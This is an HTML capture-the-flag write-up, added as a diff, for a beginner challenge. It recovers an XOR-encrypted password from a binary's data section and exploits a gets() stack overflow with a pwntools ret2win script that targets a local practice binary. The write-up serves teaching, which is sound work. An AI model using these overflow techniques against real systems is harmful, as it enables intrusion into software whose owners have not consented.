@@ -1,0 +1,462 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Cipher Binary CTF Writeup</title>
+
+<style>
+body{
+    font-family: Arial, Helvetica, sans-serif;
+    margin:40px;
+    background:#f5f5f5;
+    color:#222;
+    line-height:1.7;
+}
+.container{
+    max-width:1000px;
+    margin:auto;
+    background:white;
+    padding:40px;
+    border-radius:10px;
+    box-shadow:0 0 10px rgba(0,0,0,.1);
+}
+h1,h2,h3{
+    color:#003366;
+}
+code{
+    background:#eee;
+    padding:2px 5px;
+    border-radius:4px;
+}
+pre{
+    background:#272822;
+    color:#f8f8f2;
+    padding:15px;
+    overflow:auto;
+    border-radius:8px;
+}
+table{
+    border-collapse:collapse;
+    width:100%;
+}
+table,th,td{
+    border:1px solid #ccc;
+}
+th,td{
+    padding:10px;
+}
+.note{
+    background:#ffffcc;
+    padding:12px;
+    border-left:5px solid orange;
+}
+.success{
+    background:#e8ffe8;
+    padding:12px;
+    border-left:5px solid green;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>Cipher Binary - CTF Writeup</h1>
+
+<h2>Challenge Summary</h2>
+
+<p>
+This challenge combines two beginner-friendly binary exploitation concepts:
+</p>
+
+<ul>
+<li>Reversing an XOR-encrypted password stored inside a binary.</li>
+<li>Exploiting a stack buffer overflow after successful authentication.</li>
+</ul>
+
+<hr>
+
+<h2>Step 1 - Examine Binary Protections</h2>
+
+<p>We first inspected the binary's security protections.</p>
+
+<pre>pwn checksec vuln</pre>
+
+<p><strong>Purpose</strong></p>
+
+<ul>
+<li>Determine whether PIE is enabled.</li>
+<li>Check if a stack canary exists.</li>
+<li>Verify whether NX is enabled.</li>
+<li>Understand how difficult exploitation will be.</li>
+</ul>
+
+<p>Output showed:</p>
+
+<ul>
+<li>No PIE</li>
+<li>No Stack Canary</li>
+<li>NX Enabled</li>
+</ul>
+
+<p>
+Since PIE is disabled, function addresses remain fixed every execution,
+making it easy to jump directly to the hidden <code>win()</code> function.
+</p>
+
+<hr>
+
+<h2>Step 2 - Run the Program</h2>
+
+<pre>./vuln</pre>
+
+Output:
+
+<pre>
+===================================
+Welcome to Cipher Binary!
+===================================
+[*] XOR Key: 0x42
+[*] Enter the password:
+</pre>
+
+<p>
+The binary conveniently printed the XOR key.
+This immediately tells us the password can be recovered because XOR is reversible.
+</p>
+
+<hr>
+
+<h2>Step 3 - Locate the Encrypted Password</h2>
+
+<pre>objdump -t vuln | grep expected</pre>
+
+Output:
+
+<pre>
+0000000000404040 expected
+000000000040404c expected_len
+</pre>
+
+<p><strong>Purpose</strong></p>
+
+<p>
+The symbol table revealed that the encrypted password is stored in the variable
+named <code>expected</code>.
+</p>
+
+<hr>
+
+<h2>Step 4 - Dump the Data Section</h2>
+
+<pre>objdump -s --section=.data vuln</pre>
+
+Output:
+
+<pre>
+404040
+0d32272c112731232f276300
+</pre>
+
+<p>The encrypted bytes were:</p>
+
+<pre>
+0d
+32
+27
+2c
+11
+27
+31
+23
+2f
+27
+63
+</pre>
+
+The final <code>00</code> is the null terminator.
+
+<hr>
+
+<h2>Step 5 - Recover the Password</h2>
+
+<p>
+The encryption method was XOR.
+</p>
+
+<p>
+
+Encryption:
+
+</p>
+
+<pre>
+Cipher = Plaintext XOR Key
+</pre>
+
+<p>
+
+Decryption:
+
+</p>
+
+<pre>
+Plaintext = Cipher XOR Key
+</pre>
+
+Python script:
+
+<pre>
+enc = bytes([
+0x0d,0x32,0x27,0x2c,0x11,
+0x27,0x31,0x23,0x2f,0x27,
+0x63
+])
+
+key = 0x42
+
+print(bytes(b ^ key for b in enc))
+</pre>
+
+Output:
+
+<pre>
+b'OpenSesame!'
+</pre>
+
+Recovered password:
+
+<pre>
+OpenSesame!
+</pre>
+
+<hr>
+
+<h2>Step 6 - Find the Hidden Function</h2>
+
+Command:
+
+<pre>objdump -d vuln | grep win</pre>
+
+Output:
+
+<pre>
+00000000004011d6 &lt;win&gt;
+</pre>
+
+<p><strong>Purpose</strong></p>
+
+<p>
+The hidden function prints the flag.
+Instead of executing the normal program flow,
+we intend to overwrite the return address and redirect execution to this function.
+</p>
+
+<hr>
+
+<h2>Step 7 - Find Return Gadgets</h2>
+
+Command:
+
+<pre>objdump -d vuln | grep ret</pre>
+
+Chosen gadget:
+
+<pre>
+0x40101a
+</pre>
+
+<p>
+A single RET instruction is commonly used to maintain correct stack alignment
+before transferring execution to another function.
+</p>
+
+<hr>
+
+<h2>Step 8 - Reverse the Vulnerable Function</h2>
+
+Command:
+
+<pre>
+objdump -d -Mintel vuln | sed -n '/&lt;vuln&gt;:/,/^$/p'
+</pre>
+
+Important instructions:
+
+<pre>
+sub rsp,0x40
+
+lea rax,[rbp-0x40]
+
+call gets
+</pre>
+
+<h3>Analysis</h3>
+
+<p>
+The compiler reserved 64 bytes on the stack:
+</p>
+
+<pre>
+sub rsp,0x40
+</pre>
+
+This means:
+
+<ul>
+
+<li>64-byte local buffer</li>
+
+<li>8-byte saved RBP</li>
+
+<li>Return address immediately afterwards</li>
+
+</ul>
+
+Therefore,
+
+<pre>
+64 + 8 = 72 bytes
+</pre>
+
+After 72 bytes, the saved return address can be overwritten.
+
+The use of
+
+<pre>
+gets()
+</pre>
+
+creates the vulnerability because it performs no bounds checking.
+
+<hr>
+
+<h2>Step 9 - Build the Exploit</h2>
+
+Python exploit:
+
+<pre>
+from pwn import *
+
+p = process("./vuln")
+
+p.sendline(b"OpenSesame!")
+
+payload = b"A" * 72
+payload += p64(0x40101a)
+payload += p64(0x4011d6)
+
+p.sendline(payload)
+
+p.interactive()
+</pre>
+
+<p><strong>Explanation</strong></p>
+
+<table>
+
+<tr>
+<th>Component</th>
+<th>Purpose</th>
+</tr>
+
+<tr>
+<td>OpenSesame!</td>
+<td>Passes authentication.</td>
+</tr>
+
+<tr>
+<td>72 A's</td>
+<td>Overflow buffer and overwrite saved RIP.</td>
+</tr>
+
+<tr>
+<td>RET gadget</td>
+<td>Aligns the stack before entering win().</td>
+</tr>
+
+<tr>
+<td>win()</td>
+<td>Redirects execution to the hidden function that prints the flag.</td>
+</tr>
+
+</table>
+
+<hr>
+
+<h2>Successful Exploitation</h2>
+
+<pre>
+$ python3 exploit.py
+
+[+] Starting local process './vuln'
+
+[+] Password accepted!
+
+[+] Access granted! Here is your flag:
+
+lvjf1xDnG
+</pre>
+
+<div class="success">
+
+<h3>Flag</h3>
+
+<pre>
+lvjf1xDnG
+</pre>
+
+</div>
+
+<hr>
+
+<h2>Lessons Learned</h2>
+
+<ul>
+
+<li>XOR encryption is reversible when the key is known.</li>
+
+<li>Encrypted secrets embedded inside binaries can often be recovered through reverse engineering.</li>
+
+<li>Authentication alone does not guarantee security.</li>
+
+<li>The unsafe <code>gets()</code> function is vulnerable to stack buffer overflows.</li>
+
+<li>When PIE is disabled, function addresses remain constant, simplifying return-oriented exploitation.</li>
+
+<li>A RET gadget may be required to maintain proper stack alignment before calling another function.</li>
+
+<li>Combining reverse engineering with memory corruption techniques is a common pattern in binary exploitation CTF challenges.</li>
+
+</ul>
+
+<hr>
+
+<h2>Commands Used</h2>
+
+<pre>
+pwn checksec vuln
+
+./vuln
+
+objdump -t vuln | grep expected
+
+objdump -s --section=.data vuln
+
+objdump -d vuln | grep win
+
+objdump -d vuln | grep ret
+
+objdump -d -Mintel vuln | sed -n '/<vuln>:/,/^$/p'
+
+python3 exploit.py
+</pre>
+
+</div>
+
+</body>
+</html>
+```
